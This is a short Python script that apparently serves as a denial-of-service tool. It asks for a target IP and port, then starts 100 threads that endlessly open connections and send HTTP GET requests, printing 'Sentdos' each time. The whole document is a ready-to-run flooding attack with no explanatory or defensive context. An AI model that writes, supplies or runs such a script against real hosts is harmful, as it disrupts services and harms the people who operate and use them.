import socket, threading

target = input("Target IP: ")
port = int(input("Target Port: "))

def attack():
    while True:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.close()
            print("Sentdos to " + target + " on port " + str(port))
        except:
            pass

for i in range(100): 
    t = threading.Thread(target=attack)
    t.start()
